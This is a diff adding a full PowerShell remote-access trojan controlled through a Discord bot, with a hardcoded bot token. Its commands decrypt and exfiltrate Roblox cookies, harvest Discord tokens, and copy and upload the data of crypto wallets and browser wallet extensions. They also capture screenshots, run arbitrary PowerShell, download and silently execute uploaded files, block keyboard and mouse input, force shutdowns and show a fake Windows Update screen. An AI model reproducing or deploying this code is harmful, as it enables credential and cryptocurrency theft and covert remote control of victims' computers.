@@ -1,0 +1,510 @@
+# --- CONFIG ---
+$Token = "MTU2NTAzNTMyNDY5NzA4ODIzMA.G8pUhG.TTqmEy-vDPvpXTSys_AQ1U5NBXgDXmVg4QBgJk"
+$GuildID = "1565029122097283165"
+$PCName = $env:COMPUTERNAME.ToLower()
+
+$Headers = @{
+"Authorization" = "Bot $Token"
+"User-Agent" = "DiscordBot (https://discord.com, 1.0)"
+}
+$Global:IsDead = $false
+$Global:InputBlocked = $false
+$Global:AwaitingFile = $false
+
+Write-Host "Starting Setup for $PCName..." -ForegroundColor Yellow
+
+# 1. Find or Create the channel
+try {
+$Channels = Invoke-RestMethod -Uri "https://discord.com/api/v10/guilds/$GuildID/channels" -Headers $Headers
+$MyChannel = $Channels | Where-Object { $_.name -eq $PCName -and $_.type -eq 0 }
+
+if ($MyChannel) {
+$ChannelID = $MyChannel.id
+Write-Host "Found existing channel: $PCName" -ForegroundColor Green
+} else {
+$Body = @{ name = $PCName; type = 0 } | ConvertTo-Json
+$NewChannel = Invoke-RestMethod -Uri "https://discord.com/api/v10/guilds/$GuildID/channels" -Method Post -Headers $Headers -Body $Body -ContentType "application/json"
+$ChannelID = $NewChannel.id
+Write-Host "Created new channel: $PCName" -ForegroundColor Green
+}
+} catch {
+Write-Host "Failed to connect. Check your Bot Token, Guild ID, and permissions." -ForegroundColor Red
+return
+}
+
+# 2. Helper Functions
+function Send-Text($content) {
+$body = @{ content = $content } | ConvertTo-Json
+$h = $Headers.Clone()
+$h["Content-Type"] = "application/json"
+try { Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ChannelID/messages" -Method Post -Headers $h -Body $body | Out-Null } catch {}
+}
+
+function Send-File($filePath) {
+try { curl.exe -s -H "Authorization: Bot $Token" -F "file=@$filePath" "https://discord.com/api/v10/channels/$ChannelID/messages" | Out-Null } catch {}
+}
+
+function Set-Volume($level) {
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Vol {
+[DllImport("user32.dll")]
+public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+}
+"@
+if ($level -gt 50) {
+for ($i = 0; $i -lt 50; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
+$target = [math]::Round(($level - 50) / 2)
+for ($i = 0; $i -lt $target; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
+} else {
+for ($i = 0; $i -lt 50; $i++) { [Vol]::keybd_event(0xAE, 0, 0, [UIntPtr]::Zero) }
+$target = [math]::Round((50 - $level) / 2)
+for ($i = 0; $i -lt $target; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
+}
+}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class InputBlocker {
+[DllImport("user32.dll")]
+public static extern bool BlockInput(bool fBlockIt);
+}
+"@
+
+# 3. Connect to Gateway
+$Gateway = Invoke-RestMethod -Uri "https://discord.com/api/v10/gateway" -Headers $Headers
+$WsUrl = $Gateway.url + "/?v=10&encoding=json"
+$ws = New-Object System.Net.WebSockets.ClientWebSocket
+$ct = [System.Threading.CancellationToken]::None
+$ws.ConnectAsync([Uri]$WsUrl, $ct).Wait()
+
+$buffer = New-Object byte[] 8192
+$segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
+
+Write-Host "Bot is connected and listening for commands!" -ForegroundColor Green
+
+# 4. Listen for commands
+while ($ws.State -eq 'Open') {
+$result = $ws.ReceiveAsync($segment, $ct).Result
+if ($result.Count -eq 0) { break }
+
+$msg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
+$data = $msg | ConvertFrom-Json
+
+if ($data.op -eq 1) {
+$hb = @{ op = 1; d = $null } | ConvertTo-Json
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($hb)
+$ws.SendAsync([System.ArraySegment[byte]]::new($bytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+}
+
+if ($data.op -eq 10) {
+$identify = @{
+op = 2
+d = @{
+token = $Token
+intents = 33281
+properties = @{ os = "windows"; browser = "chrome"; device = "pc" }
+}
+} | ConvertTo-Json -Depth 5
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($identify)
+$ws.SendAsync([System.ArraySegment[byte]]::new($bytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+}
+
+if ($data.op -eq 0 -and $data.t -eq 'MESSAGE_CREATE') {
+if ($data.d.channel_id -eq $ChannelID -and -not $data.d.author.bot) {
+$content = $data.d.content.Trim()
+Write-Host "Received: $content" -ForegroundColor Cyan
+
+if ($Global:IsDead -and $content -ne '!selfdestruct') {
+Send-Text "This bot has been self-destructed."
+continue
+}
+
+# File Upload Handling
+if ($Global:AwaitingFile) {
+if ($data.d.attachments.Count -gt 0) {
+$Global:AwaitingFile = $false
+$fileUrl = $data.d.attachments[0].url
+$fileName = $data.d.attachments[0].filename
+$filePath = Join-Path $env:TEMP $fileName
+
+Send-Text "Downloading and executing ``$fileName``..."
+
+try {
+Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -UseBasicParsing
+Start-Process -FilePath $filePath -WindowStyle Hidden
+Send-Text "Successfully executed $fileName."
+} catch {
+Send-Text "Failed to execute file: $($_.Exception.Message)"
+}
+continue
+} else {
+$Global:AwaitingFile = $false
+Send-Text "No file detected. Execution cancelled."
+continue
+}
+}
+
+switch -Wildcard ($content) {
+'!help' {
+$help = "**Available Commands:**`n``!screenshot`` - Captures the screen`n``!grab`` - Grabs Roblox cookies`n``!discord`` - Grabs Discord tokens`n``!wallet`` - Grabs crypto wallets`n``!ip`` - Gets public IP info`n``!volume <0-100>`` - Sets system volume`n``!shutdown`` - Shuts down the PC`n``!lockscreen`` - Locks the desktop`n``!message <text>`` - Pops up a message box`n``!website <url>`` - Opens a website`n``!wallpaper <url>`` - Sets desktop wallpaper`n``!jumpscare`` - Pops a scary image + loud sound`n``!inputdisable`` - Freezes mouse & keyboard`n``!inputenable`` - Unfreezes mouse & keyboard`n``!bluescreen`` - Crashes the PC`n``!update`` - Shows fake Windows update screen`n``!execute`` - Upload a file for the bot to run`n``!selfdestruct`` - Kills all bot commands`n``!cmd <command>`` - Runs a raw PowerShell command"
+Send-Text $help
+}
+
+'!screenshot' {
+Send-Text "Capturing screen..."
+try {
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+$path = "$env:TEMP\screen.png"
+$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose(); $bmp.Dispose()
+Send-File $path
+Remove-Item $path -Force
+} catch { Send-Text "Screenshot failed." }
+}
+
+'!grab' {
+Send-Text "Grabbing Roblox cookies..."
+try {
+Add-Type -AssemblyName System.Security
+$p = "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat"
+if (Test-Path $p) {
+$r = Get-Content $p -Raw
+if ($r -match '"CookiesData"\s*:\s*"([^"]+)"') {
+$b64 = $Matches[1]
+$eb = [Convert]::FromBase64String($b64)
+$db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, 'CurrentUser')
+$c = [Text.Encoding]::UTF8.GetString($db)
+if ($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') { $cookie = $Matches[1] } else { $cookie = $c }
+$out = "$env:TEMP\cookie.txt"
+$cookie | Out-File $out
+Send-File $out
+Remove-Item $out -Force
+} else { Send-Text "No CookiesData found." }
+} else { Send-Text "Roblox cookie file not found." }
+} catch { Send-Text "Failed to grab cookies." }
+}
+
+'!discord' {
+Send-Text "Grabbing Discord tokens..."
+try {
+Add-Type -AssemblyName System.Security
+$appdata = $env:APPDATA
+$paths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
+$found = @()
+foreach ($p in $paths) {
+if (Test-Path $p) {
+Get-ChildItem $p | Where-Object { $_.Name -match '\.(ldb|log)$' } | ForEach-Object {
+$raw = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+if ($raw) {
+$matches = [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')
+foreach ($m in $matches) { $found += $m.Groups[1].Value }
+}
+}
+}
+}
+if ($found.Count -gt 0) {
+$out = "$env:TEMP\discord.txt"
+$found | Out-File $out
+Send-File $out
+Remove-Item $out -Force
+} else { Send-Text "No encrypted Discord tokens found." }
+} catch { Send-Text "Error grabbing tokens." }
+}
+
+'!wallet' {
+Send-Text "Staging wallets..."
+$appdata = $env:APPDATA
+$l = $env:LOCALAPPDATA
+$staging = Join-Path $env:TEMP "wallets"
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+mkdir $staging -Force | Out-Null
+
+$dw = @{Exodus="$appdata\Exodus";Atomic="$appdata\atomic";Electrum="$appdata\Electrum";Jaxx="$appdata\jaxx";Guarda="$appdata\Guarda";Coinomi="$appdata\Coinomi";Armory="$appdata\Armory"}
+$bw = @{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Ronin='fnjhmkhhmkbjkkabndcnnogagogbneec';BinanceChain='fhbohimaelbohpjbbldcngcnapndodjp';Coinbase='hnfanknocfeofbddgcijnmhfnkdnaad';TrustWallet='egjidjbpglichdcondbcbdnbeeppgdph';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec'}
+$br = @("$l\Google\Chrome\User Data","$l\Microsoft\Edge\User Data","$l\BraveSoftware\Brave-Browser\User Data","$appdata\Opera Software\Opera Stable")
+
+foreach ($n in $dw.Keys) {
+if (Test-Path $dw[$n]) {
+$dest = Join-Path $staging $n
+& robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
+}
+}
+foreach ($n in $bw.Keys) {
+foreach ($bp in $br) {
+$ep = Join-Path $bp "Default\Local Extension Settings\$($bw[$n])"
+if (Test-Path $ep) {
+$dest = Join-Path $staging $n
+& robocopy $ep $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS | Out-Null
+break
+}
+}
+}
+
+$stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
+if ($stagedDirs) {
+foreach ($d in $stagedDirs) {
+$zip = Join-Path $env:TEMP ($d.Name + ".zip")
+Remove-Item $zip -Force -EA SilentlyContinue
+Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
+if (Test-Path $zip) {
+Send-File $zip
+Remove-Item $zip -Force -EA SilentlyContinue
+}
+}
+Send-Text "Wallets grabbed."
+} else {
+Send-Text "No wallets found."
+}
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+}
+
+'!jumpscare' {
+Send-Text "Boo."
+try {
+Set-Volume 100
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+[System.Media.SystemSounds]::Hand.Play()
+
+$form = New-Object System.Windows.Forms.Form
+$form.FormBorderStyle = 'None'
+$form.WindowState = 'Maximized'
+$form.TopMost = $true
+$form.BackColor = [System.Drawing.Color]::Black
+$form.ShowInTaskbar = $false
+
+$imgUrl = "https://i.imgur.com/8QO4z0O.jpeg"
+$imgPath = "$env:TEMP\scary.jpg"
+
+Remove-Item $imgPath -Force -EA SilentlyContinue
+Invoke-WebRequest -Uri $imgUrl -OutFile $imgPath -UseBasicParsing -ErrorAction SilentlyContinue
+
+if (Test-Path $imgPath) {
+$bytes = [System.IO.File]::ReadAllBytes($imgPath)
+$ms = New-Object System.IO.MemoryStream(,$bytes)
+
+$pic = New-Object System.Windows.Forms.PictureBox
+$pic.Image = [System.Drawing.Image]::FromStream($ms)
+$pic.SizeMode = 'Zoom'
+$pic.Dock = 'Fill'
+$form.Controls.Add($pic)
+} else {
+$lbl = New-Object System.Windows.Forms.Label
+$lbl.Text = "BOO!"
+$lbl.ForeColor = [System.Drawing.Color]::Red
+$lbl.Font = New-Object System.Drawing.Font("Arial", 150, [System.Drawing.FontStyle]::Bold)
+$lbl.Dock = 'Fill'
+$lbl.TextAlign = 'MiddleCenter'
+$form.Controls.Add($lbl)
+}
+
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 3000
+$timer.Add_Tick({ $form.Close() })
+$timer.Start()
+
+[System.Windows.Forms.Application]::Run($form)
+
+if ($ms) { $ms.Dispose() }
+} catch {
+Send-Text "Jumpscare failed: $($_.Exception.Message)"
+}
+}
+
+'!inputdisable' {
+try {
+[InputBlocker]::BlockInput($true)
+$Global:InputBlocked = $true
+Send-Text "Mouse and keyboard locked globally. Use !inputenable to restore."
+} catch { Send-Text "Failed to block input." }
+}
+
+'!inputenable' {
+try {
+[InputBlocker]::BlockInput($false)
+$Global:InputBlocked = $false
+Send-Text "Mouse and keyboard restored."
+} catch { Send-Text "Failed to unblock input." }
+}
+
+'!execute' {
+$Global:AwaitingFile = $true
+Send-Text "Please upload the file you want to execute in the next message."
+}
+
+'!bluescreen' {
+Send-Text "Crashing Windows..."
+Stop-Computer -Force
+}
+
+'!update' {
+Send-Text "Showing fake update screen..."
+try {
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.FormBorderStyle = 'None'
+$form.WindowState = 'Maximized'
+$form.TopMost = $true
+$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$form.ShowInTaskbar = $false
+
+$lblTitle = New-Object System.Windows.Forms.Label
+$lblTitle.Text = "Windows Update"
+$lblTitle.ForeColor = [System.Drawing.Color]::White
+$lblTitle.Font = New-Object System.Drawing.Font("Segoe UI", 40, [System.Drawing.FontStyle]::Regular)
+$lblTitle.AutoSize = $true
+$lblTitle.Location = New-Object System.Drawing.Point(200, 200)
+$form.Controls.Add($lblTitle)
+
+$lblSub = New-Object System.Windows.Forms.Label
+$lblSub.Text = "Your computer may restart a few times.`nPlease keep your computer on."
+$lblSub.ForeColor = [System.Drawing.Color]::White
+$lblSub.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Regular)
+$lblSub.AutoSize = $true
+$lblSub.Location = New-Object System.Drawing.Point(200, 280)
+$form.Controls.Add($lblSub)
+
+$lblPercent = New-Object System.Windows.Forms.Label
+$lblPercent.Text = "0%"
+$lblPercent.ForeColor = [System.Drawing.Color]::White
+$lblPercent.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Regular)
+$lblPercent.AutoSize = $true
+$lblPercent.Location = New-Object System.Drawing.Point(200, 400)
+$form.Controls.Add($lblPercent)
+
+$pb = New-Object System.Windows.Forms.ProgressBar
+$pb.Minimum = 0
+$pb.Maximum = 100
+$pb.Value = 0
+$pb.Width = 800
+$pb.Height = 10
+$pb.Location = New-Object System.Drawing.Point(200, 450)
+$form.Controls.Add($pb)
+
+$script:progress = 0
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 5000
+$timer.Add_Tick({
+$script:progress++
+if ($script:progress -gt 100) { $script:progress = 0 }
+$pb.Value = $script:progress
+$lblPercent.Text = "$($script:progress)%"
+})
+$timer.Start()
+
+$closeTimer = New-Object System.Windows.Forms.Timer
+$closeTimer.Interval = 900000
+$closeTimer.Add_Tick({
+$closeTimer.Stop()
+$form.Close()
+})
+$closeTimer.Start()
+
+[System.Windows.Forms.Application]::Run($form)
+
+} catch { Send-Text "Update screen failed." }
+}
+
+'!selfdestruct' {
+$Global:IsDead = $true
+Send-Text "💀 **Self-destruct activated.** All commands are now disabled. You must restart the bot script to enable them again."
+}
+
+'!volume *' {
+$lvl = $content.Substring(8).Trim()
+if ($lvl -match '^\d+$' -and [int]$lvl -ge 0 -and [int]$lvl -le 100) {
+Set-Volume ([int]$lvl)
+Send-Text "Volume set to $lvl%."
+} else {
+Send-Text "Invalid volume. Use a number between 0 and 100."
+}
+}
+
+'!wallpaper *' {
+$url = $content.Substring(11).Trim()
+Send-Text "Setting wallpaper from URL..."
+try {
+$imgPath = "$env:TEMP\wallpaper.jpg"
+Invoke-WebRequest -Uri $url -OutFile $imgPath -UseBasicParsing
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+[DllImport("user32.dll", CharSet = CharSet.Auto)]
+public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)
+Send-Text "Wallpaper changed successfully."
+} catch { Send-Text "Failed to change wallpaper." }
+}
+
+'!lockscreen' {
+Send-Text "Locking screen..."
+rundll32.exe user32.dll,LockWorkStation
+}
+
+'!message *' {
+$msg = $content.Substring(9).Trim()
+try {
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.MessageBox]::Show($msg, "System", 'OK', 'Warning')
+} catch {}
+}
+
+'!website *' {
+$url = $content.Substring(9).Trim()
+Send-Text "Opening URL..."
+Start-Process $url
+}
+
+'!ip' {
+try {
+$ip = Invoke-RestMethod -Uri "https://api.ipify.org"
+$geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip"
+$info = "**IP:** $ip`n**Country:** $($geo.country)`n**City:** $($geo.city)`n**ISP:** $($geo.isp)"
+Send-Text $info
+} catch { Send-Text "Failed to get IP." }
+}
+
+'!shutdown' {
+Send-Text "Shutting down..."
+Start-Sleep -Seconds 2
+Stop-Computer -Force
+}
+
+'!cmd *' {
+$cmd = $content.Substring(5).Trim()
+$output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
+
+if ($output.Length -gt 1800) {
+$out = "$env:TEMP\cmd_out.txt"
+$output | Out-File $out
+Send-File $out
+Remove-Item $out -Force
+} else {
+Send-Text "**Command:** ``$cmd```n``````n$output`n``````"
+}
+}
+
+default {
+if ($content.StartsWith("!")) {
+Send-Text "Unknown command. Type `!help` for a list of commands."
+}
+}
+}
+}
+}
+}
